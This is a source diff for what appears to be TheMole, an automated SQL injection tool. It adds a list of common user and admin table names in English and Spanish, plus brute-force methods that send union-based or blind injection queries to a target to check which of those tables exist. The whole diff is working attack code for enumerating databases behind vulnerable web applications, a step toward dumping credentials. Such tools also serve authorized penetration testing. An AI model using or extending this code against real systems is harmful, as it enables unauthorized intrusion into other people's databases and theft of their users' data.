@@ -38,6 +38,24 @@ class TheMole:
     ex_string = 'Operation not supported for this dumper'
     field = '[_SQL_Field_]'
     table = '[_SQL_Table_]'
+    users_tables = [
+        'adm',
+        'admin',
+        'admins',
+        'administrator',
+        'administrador',
+        'administradores',
+        'client',
+        'clients',
+        'login',
+        'logins',
+        'user',
+        'users',
+        'usuario',
+        'usuarios',
+        'usr',
+        'usrs',
+    ]
     
     dbms_mole_list = [MysqlMole, SQLServerMole, PostgresMole, OracleMole]
     
@@ -304,6 +322,28 @@ class TheMole:
         else:
             return data
 
+    def brute_force_tables(self, db, table_list):
+        for table in table_list:
+            print('[i] Trying table', table)
+            try:
+                exists = False
+                if self.mode == 'union':
+                    req = self.get_requester().request(self.generate_url(self._dbms_mole.fields_count_query(db, table, self.query_columns, self.injectable_field)))
+                    exists = not self._dbms_mole.parse_results(self.analyser.decode(req)) is None
+                else:
+                    req = self.get_requester().request(self.generate_url(
+                                self._dbms_mole.fields_blind_count_query('>', 100000000, db=db, table=table),
+                             ))
+                    if self.analyser.is_valid(req):
+                        exists = True
+                if exists:
+                    print('[+] Table',table,'exists.')
+            except:
+                pass
+    
+    def brute_force_users_tables(self, db):
+        self.brute_force_tables(db, TheMole.users_tables)
+
     def _generic_blind_len(self, count_fun, trying_msg, max_msg):
         length = 0
         last = 1
@@ -322,6 +362,7 @@ class TheMole:
         sys.stdout.flush()
         pri = last // 2
         while pri < last:
+            
             if self.stop_query:
                 return pri
             medio = ((pri + last) // 2) + ((pri + last) & 1)
